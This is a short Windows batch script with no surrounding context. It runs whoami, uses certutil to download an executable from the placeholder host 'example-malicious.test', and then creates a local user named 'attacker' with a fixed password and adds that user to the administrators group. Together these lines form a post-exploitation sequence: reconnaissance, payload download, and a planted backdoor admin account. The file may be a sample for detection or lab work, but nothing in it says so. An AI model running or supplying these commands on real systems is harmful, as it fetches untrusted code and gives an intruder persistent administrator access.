@echo off
cmd.exe /c whoami
certutil -urlcache -split -f http://example-malicious.test/tool.exe tool.exe
net user attacker P@ssw0rd123 /add
net localgroup administrators attacker /add
